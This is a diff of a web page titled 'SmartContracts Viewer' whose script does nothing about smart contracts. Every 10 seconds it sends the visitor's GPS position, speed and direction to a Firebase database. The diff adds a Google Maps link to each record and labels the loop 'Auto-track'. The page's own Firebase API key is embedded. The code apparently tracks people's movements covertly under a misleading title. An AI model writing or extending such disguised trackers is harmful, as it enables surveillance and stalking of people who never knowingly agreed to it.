@@ -4,6 +4,7 @@
   <title>SmartContracts Viewer</title>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -42,7 +43,7 @@
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
   <script>
-    // ✅ Replace this with your actual config
+    // ✅ Your Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
       authDomain: "gps-d0bab.firebaseapp.com",
@@ -56,12 +57,11 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Generate fake user ID for session
-    const userId = 'device_' + Math.random().toString(36).substr(2, 9);
+    // Random device ID for anonymity
+    const userId = 'device_' + Math.random().toString(36).substring(2, 10);
 
-    // Function to get direction from heading
     function getDirection(heading) {
-      if (heading === null) return "Unknown";
+      if (heading === null || isNaN(heading)) return "Unknown";
       const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];
       return directions[Math.round(heading / 45) % 8];
     }
@@ -70,9 +70,15 @@
       const { latitude, longitude, speed, heading } = position.coords;
       const direction = getDirection(heading);
       const timestamp = new Date().toISOString();
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
       db.ref('locations/' + userId).set({
-        latitude, longitude, speed, direction, timestamp
+        latitude,
+        longitude,
+        speed,
+        direction,
+        timestamp,
+        maps_link: mapsLink
       });
     }
 
@@ -86,7 +92,7 @@
       }
     }
 
-    // Auto update location every 10 seconds
+    // Auto-track every 10 seconds
     setInterval(trackLocation, 10000);
     trackLocation();
   </script>
